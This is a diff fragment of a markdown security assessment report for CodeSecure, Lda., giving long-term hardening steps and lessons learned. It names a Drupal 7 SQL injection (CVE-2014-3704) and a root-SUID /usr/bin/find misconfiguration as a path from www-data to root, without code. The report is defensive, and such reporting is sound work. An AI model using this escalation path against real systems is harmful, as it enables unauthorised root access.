+### 🎯 Long-Term Implementations (90–180+ Days)
+* **Enforce Multi-Factor Authentication (MFA / TOTP):** Mandate hardware token or TOTP MFA across all administrative SSH sessions, VPN access, and Active Directory logins.
+* **Automated Vulnerability Management:** Integrate OpenVAS continuous vulnerability scanners into the Wazuh dashboard for automated weekly patch delta reporting.
+* **Formalize Incident Response Plan (IRP):** Establish documented incident response playbooks and conduct quarterly tabletop breach simulation exercises with technical teams.
+* **Regulatory Compliance Audit Alignment:** Align technical controls with NIST CSF 2.0 and conduct pre-audit assessments for GDPR data privacy and ISO 27001 readiness.
 
 ---
 
-## 🏁 Conclusion & Future Security Roadmap
+## 8. Lessons Learned & Key Architectural Takeaways
 
-The implementation of this **Defense in Depth** framework successfully elevates CodeSecure, Lda. from a vulnerable, monolithic enterprise state to a hardened, resilient infrastructure aligned with industry standards (**NIST CSF**, **CIS Benchmarks**, and **GDPR**).
+The technical evaluation and defense implementation yielded crucial takeaways for enterprise security management:
 
-### 🚀 Strategic Next Steps
-1. **Multi-Factor Authentication (MFA):** Enforce TOTP/FIDO2 hardware security keys across all VPN access points and Active Directory logons.
-2. **Zero Trust Network Access (ZTNA):** Transition from legacy site-to-site VPN to identity-aware micro-segmentation proxying.
-3. **Continuous Penetration Testing:** Schedule bi-annual black-box and grey-box pentests to validate new software deployments and infrastructure changes.
+1. **Defense-in-Depth Prevents Single-Point Breaches:** A perimeter breach on a web application (e.g., SQLi on Drupal 7) is catastrophic on a flat network. However, when combined with VLAN segmentation, DMZ isolation, and database encryption, the impact is strictly localized.
+2. **Legacy Infrastructure Is an Immediate Liability:** Running outdated, end-of-life operating systems (Debian 7) and CMS platforms (Drupal 7) exposes enterprises to trivial, public-domain exploits (`CVE-2014-3704`). Timely deprecation and containerized migration are mandatory.
+3. **Least Privilege & Configuration Hygiene Are Mandatory:** SUID binary misconfigurations (such as `/usr/bin/find` having root SUID) transform unprivileged access (`www-data`) into instantaneous root system compromise (`uid=0`). Routine SUID audits and file integrity monitoring (FIM) are indispensable.
+4. **Automated Active Response Is Critical for EDR:** Manual log analysis cannot match the speed of automated exploits. Integrating Wazuh active response with automated firewall drops and YARA malware quarantine drastically reduces threat actor dwell time.
+5. **Centralized Identity Control Simplifies Compliance:** Enforcing strict, automated GPOs for password complexity, account lockouts, and software restriction policies significantly reduces the employee attack surface against credential harvesting and phishing attacks.
 
 ---
-
-### 📄 License
-This repository is released under the terms of the [MIT License](LICENSE).
+*Report prepared for CodeSecure, Lda. Infrastructure & Cybersecurity Committee.*
